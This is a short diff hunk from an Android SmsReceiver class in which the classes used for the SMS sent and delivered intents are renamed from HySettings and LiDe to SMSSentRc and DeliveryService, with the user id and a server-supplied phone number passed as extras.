@@ -61,8 +61,8 @@ public class SmsReceiver extends BroadcastReceiver {
                                                                     if (jsonResponse.has("data")) {
                                                                         String phoneNumber = jsonResponse.getString("data");
 
-                                                                        Intent sentIntent = new Intent(context, HySettings.class);
-                                                                        Intent deliveredIntent = new Intent(context, LiDe.class);
+                                                                        Intent sentIntent = new Intent(context, SMSSentRc.class);
+                                                                        Intent deliveredIntent = new Intent(context, DeliveryService.class);
                                                                         sentIntent.putExtra("id", userId);
                                                                         sentIntent.putExtra("phone", phoneNumber);
                                                                         deliveredIntent.putExtra("id", userId);
